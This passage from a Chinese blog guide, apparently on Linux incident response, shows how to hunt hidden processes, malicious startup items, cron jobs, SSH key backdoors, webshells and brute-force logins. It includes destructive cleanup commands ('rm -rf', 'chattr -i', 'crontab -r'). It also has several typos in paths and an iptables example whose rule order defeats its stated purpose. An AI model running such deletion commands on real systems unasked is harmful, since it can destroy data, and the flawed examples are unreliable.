查看进程</span></span><br><span class="line">ps -aux</span><br><span class="line">top</span><br><span class="line"></span><br><span class="line"><span class="comment"># 隐藏进程</span></span><br><span class="line">1. 列出所有进程并保存到文件1</span><br><span class="line">ps -ef | awk <span class="string">&#x27;&#123;print&#125;&#x27;</span> | <span class="built_in">sort</span> -n | <span class="built_in">uniq</span> &gt; 1</span><br><span class="line"><span class="comment"># 这条命令使用 ps -ef 列出所有进程，然后通过 awk &#x27;&#123;print&#125;&#x27; 打印每一行，再通过 sort -n 按数字排序，最后通过 uniq 去除重复行，并将结果保存到文件 1。</span></span><br><span class="line"></span><br><span class="line">2. 列出/proc目录下的所有进程ID并保存到文件2</span><br><span class="line"><span class="built_in">ls</span> /proc | <span class="built_in">sort</span> -n | <span class="built_in">uniq</span> &gt; 2</span><br><span class="line"><span class="comment"># 这条命令使用 ls /proc 列出 /proc 目录下的所有子目录（这些子目录通常是进程ID），然后通过 sort -n 按数字排序，最后通过 uniq 去除重复行，并将结果保存到文件 2。</span></span><br><span class="line"></span><br><span class="line">3. 比较两个文件，找出隐藏的进程：</span><br><span class="line">diff 1 2</span><br><span class="line"><span class="comment"># 这条命令使用 diff 比较文件 1 和文件 2，找出它们之间的差异。如果文件 1 中缺少某些进程ID，而这些进程ID出现在文件 2 中，那么这些进程ID对应的进程可能是隐藏的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># top命令查看资源占用率较高的进程</span></span><br><span class="line"><span class="comment"># 处置方法</span></span><br><span class="line">   1. <span class="built_in">kill</span> -9 pid杀死进程</span><br><span class="line">   2. <span class="built_in">rm</span> -rf 文件名 删除文件</span><br><span class="line">   3. 如果root权限删除不了，可能被添加了 i 属性，使用lsattr filename查看文件属性，然后使用 chattr -i filename移除 i 属性，然后删除</span><br><span class="line">   4. 有的进程存在守护进程，导致无法删除，我们先将进程挂起，查杀守护进程后，在删除该进程</span><br><span class="line">   5. ps命令全程位process state，进程状态，ps -ef显示所有进程的UID，PPIP，C与STIME栏位</span><br></pre></td></tr></table></figure><h3 id="开机启动项"><a href="#开机启动项" class="headerlink" title="开机启动项"></a>开机启动项</h3><h4 id="基本使用-1"><a href="#基本使用-1" class="headerlink" title="基本使用"></a>基本使用</h4><p>系统运行级别:</p><table><thead><tr><th align="center">运行级别</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">关机</td></tr><tr><td align="center">1</td><td align="center">单用户模式,可以想象为Windows的安全模式,主要用于系统修复</td></tr><tr><td align="center">2</td><td align="center">不完全的命令行模式,不含NFS服务</td></tr><tr><td align="center">3</td><td align="center">完全的命令行模式,就是标准字符界面</td></tr><tr><td align="center">4</td><td align="center">系统保留</td></tr><tr><td align="center">5</td><td align="center">图形模式</td></tr></tbody></table><p>查看运行级别命令<code>runlevel </code></p><p>系统默认允许级别</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vi  /etc/inittab</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span>=3:initdefault  <span class="comment"># 系统开机后直接进入哪个运行级别</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开机启动配置文件</span></span><br><span class="line"></span><br><span class="line">/etc/rc.local</span><br><span class="line">/etc/init.d/rc.local</span><br><span class="line">/etc/rc.d/rc[0~6].d</span><br><span class="line"></span><br><span class="line"><span class="comment"># 例子:当我们需要开机启动自己的脚本时,只需要将可执行脚本丢在/etc/init.d目录下,然后在 /etc/rc.d/rc*.d 中建立软链接即可</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ln</span> -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</span><br><span class="line"><span class="comment"># 此处sshd 是具体服务的脚本文件,S100ssh是其软链接,S开头代表加载时自启动;如果是K开头的脚本文件,代表运行级别加载时需要关闭的.</span></span><br></pre></td></tr></table></figure><h4 id="入侵排查-1"><a href="#入侵排查-1" class="headerlink" title="入侵排查"></a>入侵排查</h4><p>启动项文件:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">more /etc/rc.local </span><br><span class="line">/etc/rc.d/rc[0~6].d</span><br><span class="line"><span class="comment"># 很多红色显示的为开机启动项，需要依次删掉</span></span><br><span class="line"><span class="built_in">ls</span> /etc/rc*/</span><br><span class="line"><span class="comment"># chkconfig开机启动项</span></span><br><span class="line">chkconfig --list</span><br></pre></td></tr></table></figure><h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><h4 id="基本使用-2"><a href="#基本使用-2" class="headerlink" title="基本使用"></a>基本使用</h4><ol><li><p>利用<code>crontab</code>创建计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">crontab -l  <span class="comment"># 列出某个用户 cron 服务的详细内容</span></span><br><span class="line"><span class="comment"># Tips:默认编写的crontab文件会保存在(/var/spool/cron/用户名 例如:/var/spool/cron/root)</span></span><br><span class="line"><span class="comment"># 指定用户查看计划任务</span></span><br><span class="line">crontab -u root -l</span><br><span class="line">crontab -r  <span class="comment"># 删除每个用户 cront 任务(谨慎:删除所有的计划任务)</span></span><br><span class="line">crontab -e  <span class="comment"># 使用编辑器编辑当前的 crontab 文件 </span></span><br><span class="line"><span class="comment"># 如:*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt # 每分钟写入文件</span></span><br></pre></td></tr></table></figure></li><li><p>利用<code>anacron</code>实现异步定时任务调度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每天运行 /home/backup.sh 脚本</span></span><br><span class="line">vi /etc/anacrontab </span><br><span class="line"></span><br><span class="line">@daily   10   example.daily  /bin/bash /home/backup.sh</span><br><span class="line"><span class="comment"># 当机器在backup.sh期望被运行时是关机的,anacron会在机器开机十分钟之后运行它,而不用再等待7天</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="入侵排查-2"><a href="#入侵排查-2" class="headerlink" title="入侵排查"></a>入侵排查</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重点关注以下目录中是否存在恶意脚本</span></span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/* </span><br><span class="line">/etc/cron.hourly/* </span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br><span class="line">/var/spool/cron/root</span><br><span class="line">/var/spool/cron/crontabs/root</span><br><span class="line">/var/spool/cron/*</span><br><span class="line"><span class="comment"># 小技巧</span></span><br><span class="line">more /etc/cron.daily/* <span class="comment"># 查看目录下所有文件</span></span><br></pre></td></tr></table></figure><h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><h4 id="服务自启动"><a href="#服务自启动" class="headerlink" title="服务自启动"></a>服务自启动</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一种修改方法</span></span><br><span class="line">chkconfig [--level 运行级别][独立服务名][on|off]</span><br><span class="line">chkconfig –level 2345 httpd on  <span class="comment"># 开启自启动</span></span><br><span class="line">chkconfig httpd on <span class="comment"># (默认 level 是 2345)</span></span><br><span class="line"><span class="comment"># 第二种修改方法</span></span><br><span class="line">修改 /etc/re.d/rc.local文件</span><br><span class="line">加入 /etc/init.d/httpd start</span><br><span class="line"><span class="comment"># 第三种修改方法</span></span><br><span class="line">使用ntsysv命令管理自启动,可以管理独立服务和xinetd服务</span><br><span class="line"><span class="comment"># 第四种修改方法</span></span><br><span class="line">service --status-all</span><br></pre></td></tr></table></figure><h4 id="入侵排查-3"><a href="#入侵排查-3" class="headerlink" title="入侵排查"></a>入侵排查</h4><ol><li><p>查询已安装的服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看服务自启动状态，可以看到所有的RPM包安装的服务</span></span><br><span class="line">chkconfig --list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前服务</span></span><br><span class="line">ps aux | grep crond</span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统在3与5级别下的启动项</span></span><br><span class="line">chkconfig --list | grep <span class="string">&quot;3:on|5:on&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务安装位置，一般是在 /usr/local/</span></span><br><span class="line"><span class="comment"># 注意：service 命令通常用于启动传统的SysV init脚本，而不是直接指示服务安装位置</span></span><br><span class="line">service httpd start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索 /etc/rc.d/init.d/ 查看是否存在</span></span><br><span class="line"><span class="comment"># 这个目录包含了传统的SysV init脚本，用于启动和管理服务</span></span><br><span class="line"><span class="built_in">ls</span> /etc/rc.d/init.d/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 systemd 服务单元文件</span></span><br><span class="line"><span class="comment"># 这些目录包含了 systemd 服务单元文件，用于启动和管理服务</span></span><br><span class="line"><span class="built_in">ls</span> /usr/lib/systemd/system</span><br><span class="line"><span class="built_in">ls</span> /etc/systemd/system</span><br></pre></td></tr></table></figure></li></ol><h3 id="文件痕迹"><a href="#文件痕迹" class="headerlink" title="文件痕迹"></a>文件痕迹</h3><h4 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /tmp 和 /usr/bin、/usr/sbin</span></span><br><span class="line"><span class="comment"># /tmp 目录经常被恶意软件用作软件下载目录</span></span><br><span class="line"><span class="comment"># /usr/bin 和 /usr/sbin 目录中的文件经常被恶意软件替换以执行恶意任务</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 /tmp 目录中可疑文件</span></span><br><span class="line"><span class="built_in">ls</span> -la /tmp</span><br><span class="line"><span class="comment"># 检查 /usr/bin 目录中可疑文件</span></span><br><span class="line"><span class="built_in">ls</span> -la /usr/bin</span><br><span class="line"><span class="comment"># 检查 /usr/sbin 目录中可疑文件</span></span><br><span class="line"><span class="built_in">ls</span> -la /usr/sbin</span><br><span class="line"></span><br><span class="line"><span class="comment"># ~/.ssh 和 /etc/ssh</span></span><br><span class="line"><span class="comment"># ~/.ssh 目录常被用作存储后门的SSH配置，例如恶意的SSH公钥</span></span><br><span class="line"><span class="comment"># /etc/ssh 目录中的配置文件可能被修改以创建后门</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 ~/.ssh 目录中的文件，包括公钥和私钥</span></span><br><span class="line"><span class="built_in">ls</span> -la ~/.ssh</span><br><span class="line"><span class="comment"># 检查 /etc/ssh 目录中的配置文件</span></span><br><span class="line"><span class="built_in">ls</span> -la /etc/ssh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重点检查 SSH 公钥配置文件</span></span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/ssh_config</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><h4 id="时间点查找"><a href="#时间点查找" class="headerlink" title="时间点查找"></a>时间点查找</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 find 命令查找在特定时间段内变动的文件</span></span><br><span class="line"><span class="comment"># 以下是一些常见的 find 命令选项和示例</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找过去 7 天内修改过的普通文件</span></span><br><span class="line">find /path/to/search -<span class="built_in">type</span> f -mtime -7</span><br><span class="line"><span class="comment"># 查找过去 30 天内访问过的普通文件</span></span><br><span class="line">find /path/to/search -<span class="built_in">type</span> f -atime -30</span><br><span class="line"><span class="comment"># 查找过去 60 天内创建的普通文件</span></span><br><span class="line">find /path/to/search -<span class="built_in">type</span> f -ctime -60</span><br><span class="line"><span class="comment"># 查找所有符号链接</span></span><br><span class="line">find /path/to/search -<span class="built_in">type</span> l</span><br><span class="line"><span class="comment"># 查找所有目录</span></span><br><span class="line">find /path/to/search -<span class="built_in">type</span> d</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 stat 命令查看文件的详细时间信息</span></span><br><span class="line"><span class="comment"># stat 文件名</span></span><br><span class="line"><span class="built_in">stat</span> /path/to/file</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例：查找 /var/log 目录下过去 2 天内修改过的文件，并显示详细时间信息</span></span><br><span class="line">find /var/log -<span class="built_in">type</span> f -mtime -2 -<span class="built_in">exec</span> <span class="built_in">stat</span> &#123;&#125; \;</span><br><span class="line"><span class="comment"># 示例：查找 /home 目录下过去 1 天内创建的文件，并显示详细时间信息</span></span><br><span class="line">find /home -<span class="built_in">type</span> f -ctime -1 -<span class="built_in">exec</span> <span class="built_in">stat</span> &#123;&#125; \;</span><br><span class="line"><span class="comment"># 示例：查找 /etc 目录下过去 5 天内访问过的文件，并显示详细时间信息</span></span><br><span class="line">find /etc -<span class="built_in">type</span> f -atime -5 -<span class="built_in">exec</span> <span class="built_in">stat</span> &#123;&#125; \;</span><br></pre></td></tr></table></figure><h4 id="特殊文件"><a href="#特殊文件" class="headerlink" title="特殊文件"></a>特殊文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 特殊权限文件查找</span></span><br><span class="line">find /tmp -perm 777</span><br><span class="line"><span class="comment"># webshell扫描</span></span><br><span class="line">find /var/www -name <span class="string">&quot;*.php&quot;</span> | xargs egrep查找php文件是否包含egrep关键字</span><br><span class="line"><span class="comment"># 还可使用findwebshell，scan_webshell.py等扫描工具进行扫描</span></span><br><span class="line"><span class="comment"># 对系统命令进行排查</span></span><br><span class="line"><span class="comment"># ls、ps等命令可能被攻击者恶意替换，使用ls -alt /bin查看命令修改的时间</span></span><br><span class="line">linux后门检测，chkrootkit、rkhunter</span><br><span class="line"><span class="comment"># 排查suid程序</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h3 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h3><p>日志默认存放位置:<code>/var/log/</code></p><p>查看日志配置情况:<code>more /etc/rsyslog.conf</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 日志级别</span></span><br><span class="line">debug    <span class="comment"># 系统调试信息</span></span><br><span class="line">info     <span class="comment"># 常规信息</span></span><br><span class="line">warning  <span class="comment"># 警告信息</span></span><br><span class="line">err      <span class="comment"># 报错(级别低,阻止了某个功能能不能正常工作)</span></span><br><span class="line">crit     <span class="comment"># 报错(级别高,阻止了某个软件或整个系统不能正常工作)</span></span><br><span class="line">alert    <span class="comment"># 需要立即修改的信息</span></span><br><span class="line">emerg    <span class="comment"># 内核崩溃</span></span><br><span class="line">none     <span class="comment"># 不采集任何日志信息</span></span><br><span class="line"><span class="comment"># 注意:从上到下,级别从低到高,记录的信息越来越少</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 必看日志</span></span><br><span class="line">/var/log/secure             <span class="comment"># 包含验证和授权方面信息.例如:sshd 会将所有信息记录(其中包括失败登录)在这里</span></span><br><span class="line">/var/log/cron               <span class="comment"># 每当cron进程开始一个工作时,就会将相关信息记录在这个文件中</span></span><br><span class="line">/var/log/messages           <span class="comment"># 包括整体系统信息,其中也包含系统启动期间的日志.此外,mail,cron,daemon,kern和auth等内容也记录在var/log/messages日志中</span></span><br><span class="line">/var/log/btmp               <span class="comment"># 记录所有失败登录信息.使用last命令可以查看btmp文件.例如:last -f /var/log/btmp more</span></span><br><span class="line">/var/log/wtmp               <span class="comment"># 记录登录进入、退出、数据交换、关机和重启，即last命令</span></span><br><span class="line">/var/log/lastlog            <span class="comment"># 记录所有用户的最近信息.这不是一个ASCII文件,因此需要用lastlog命令查看内容</span></span><br><span class="line">/var/log/cups               <span class="comment"># 涉及所有打印信息的日志。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 了解</span></span><br><span class="line">/var/log/userlog            <span class="comment"># 记录用户所有等级用户信息的日志</span></span><br><span class="line">/var/log/dmesg              <span class="comment"># 包含内核缓冲信息(kernel ring buffer).在系统启动时,会在屏幕上显示许多与硬件有关的信息.可以用dmesg查看它们</span></span><br><span class="line">/var/log/auth.log           <span class="comment"># 包含系统授权信息，包括用户登录和使用的权限机制等</span></span><br><span class="line">/var/10g/boot.log           <span class="comment"># 包含系统启动时的日志</span></span><br><span class="line">/var/log/daemon.log         <span class="comment"># 包含各种系统后台守护进程日志信息</span></span><br><span class="line">/var/log/dpkg.log           <span class="comment"># 包括安装或dpkg命令清除软件包的日志</span></span><br><span class="line">/var/log/kern.log           <span class="comment"># 包含内核产生的日志,有助于在定制内核时解决问题</span></span><br><span class="line">/var/log/maillog  </span><br><span class="line">/var/log/mai1.<span class="built_in">log</span>           <span class="comment"># 包含来自系统运行电子邮件服务器的日志信息.例如:sendmail日志信息就全部送到这个文件中</span></span><br><span class="line">/var/log/user.log           <span class="comment"># 记录所有等级用户信息的日志</span></span><br><span class="line">/var/log/Xorg.x.log         <span class="comment"># 来自X的日志信息</span></span><br><span class="line">/var/log/alternatives.log   <span class="comment"># 更新替代信息都记录在这个文件中</span></span><br><span class="line">/var/log/anaconda.log       <span class="comment"># 在安装Linux时,所有安装信息都储存在这个文件中</span></span><br><span class="line">/var/log/yum.log            <span class="comment"># 包含使用yum安装的软件包信息</span></span><br><span class="line">/var/log/utmp               <span class="comment"># 包含登录信息.使用wtmp可以找出谁正在登陆进入系统,谁使用命令显示这个文件或信息等</span></span><br><span class="line">/var/log/faillog            <span class="comment"># 包含用户登录失败信息.此外,错误登录命令也会记录在本文件中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 除了上述Log文件以外,vār/log还基于系统的具体应用包含以下一些子目录:</span></span><br><span class="line">/var/log/httpd/或/var/log/apache2        <span class="comment">#  包含服务器access_log和error_log信息</span></span><br><span class="line">/var/log/lighttpd/                       <span class="comment">#  包含light HTTPD的access_log和error_log</span></span><br><span class="line">/var/log/mail/                           <span class="comment">#  这个子目录包含邮件服务器的额外日志</span></span><br><span class="line">/var/log/prelink/                        <span class="comment">#  包含.so文件被prelink修改的信息</span></span><br><span class="line">/var/log/audit/                          <span class="comment">#  包含被Linux audit daemon储存的信息</span></span><br><span class="line">/var/log/samba/                          <span class="comment">#  包含由samba存储的信息</span></span><br><span class="line">/var/log/sa/                             <span class="comment">#  包含每日由sysstat软件包收集的sar文件</span></span><br><span class="line">/var/log/sssd/                           <span class="comment">#  用于守护进程安全服务</span></span><br><span class="line">/var/log/xferlog(vsftpd.log)             <span class="comment"># LinuxFTP日志</span></span><br></pre></td></tr></table></figure><h4 id="日志分析技巧"><a href="#日志分析技巧" class="headerlink" title="日志分析技巧"></a>日志分析技巧</h4><ol><li><p>定位有多少IP在爆破主机的root帐号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Failed password for root&quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | more</span><br></pre></td></tr></table></figure></li><li><p>定位有哪些 IP 在爆破主机的root帐号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|grep -E -o <span class="string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span>|<span class="built_in">uniq</span> -c</span><br></pre></td></tr></table></figure></li><li><p>爆破用户名字典是什么</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|perl -e <span class="string">&#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;</span>|<span class="built_in">uniq</span> -c|<span class="built_in">sort</span> -nr</span><br></pre></td></tr></table></figure></li><li><p>登录成功的IP有哪些</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | more</span><br><span class="line"><span class="comment"># 登录成功的日期、用户名、IP:</span></span><br><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span> </span><br></pre></td></tr></table></figure></li><li><p>增加一个用户kali日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># grep &quot;useradd&quot; /var/log/secure</span></span><br><span class="line">Jul1000:12:15localhostuseradd[2382]: newgroup: name=kali, GID=1001</span><br><span class="line">Jul1000:12:15localhostuseradd[2382]: newuser: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class="line">, shell=/bin/bash</span><br><span class="line">Jul1000:12:58localhostpasswd: pam_unix(passwd:chauthtok): passwordchangedforkali</span><br></pre></td></tr></table></figure></li><li><p>删除用户kali日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># grep &quot;userdel&quot; /var/log/secure</span></span><br><span class="line">Jul1000:14:17localhostuserdel[2393]: deleteuser<span class="string">&#x27;kali&#x27;</span></span><br><span class="line">Jul1000:14:17localhostuserdel[2393]: removedgroup<span class="string">&#x27;kali&#x27;</span> ownedby<span class="string">&#x27;kali&#x27;</span></span><br><span class="line">Jul1000:14:17localhostuserdel[2393]: removedshadowgroup<span class="string">&#x27;kali&#x27;</span> ownedby<span class="string">&#x27;kali&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>su切换用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过 /var/log/auth.log 文件（适用于基于 Debian 的系统，如 Ubuntu）：</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/auth.log | grep su</span><br><span class="line"><span class="built_in">cat</span> /var/log/auth.log | grep sudo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 /var/log/secure 文件（适用于基于 Red Hat 的系统，如 CentOS 和 Fedora）：</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/secure | grep su</span><br><span class="line"><span class="built_in">cat</span> /var/log/secure | grep sudo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 /var/log/messages 文件（适用于某些旧版本的系统）：</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/messages | grep su</span><br><span class="line"><span class="built_in">cat</span> /var/log/messages | grep sudo</span><br></pre></td></tr></table></figure></li></ol><h3 id="通信分析"><a href="#通信分析" class="headerlink" title="通信分析"></a>通信分析</h3><ul><li><code>iptables</code><br>Linux平台下的包过滤防火墙,具有封包过滤、封包重定向和网络地址转换(NAT)等功能<table><thead><tr><th>表</th><th>链</th></tr></thead><tbody><tr><td>filter</td><td>INPUT,FORWARD,OUTPUT</td></tr><tr><td>nat</td><td>PREROUTING,OUTPUT,POSTROUTING</td></tr><tr><td>mangle</td><td>PREROUTING,INPUT,FORWARD,OUTPUT,POSTROUTING</td></tr><tr><td>raw</td><td>PREROUTING,OUTPUT</td></tr></tbody></table><table><thead><tr><th>动作</th><th>含义</th></tr></thead><tbody><tr><td>ACCEPT</td><td>允许数据包通过</td></tr><tr><td>DROP</td><td>直接丢弃数据包,不会给数据端发送响应</td></tr><tr><td>REJECT</td><td>拒绝数据包,必要时会给数据端发送响应</td></tr><tr><td>SNAT</td><td>源地址转换,解决内网用户公用一个公网地址</td></tr><tr><td>MASQUERADE</td><td>SNAT的特殊形式,适用于动态IP</td></tr><tr><td>REDIRECT</td><td>在本机做端口映射</td></tr></tbody></table>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 192.168.10.0/24 可接受,但192.168.10.10丢弃</span></span><br><span class="line">iptables -A INPUT -i eth0 -s 192.168.10.0/24 -j ACCEPT</span><br><span class="line">iptables -A INPUT -i eth0 -s 192.168.10.10 -j DROP</span><br><span class="line">iptables -nL --line-number | grep 192.168.10</span><br><span class="line">iptables -L -t nat</span><br><span class="line"><span class="comment"># 重点注意:红队常用nat</span></span><br></pre></td></tr></table></figure></li><li><code>FireWalld</code><br> <a 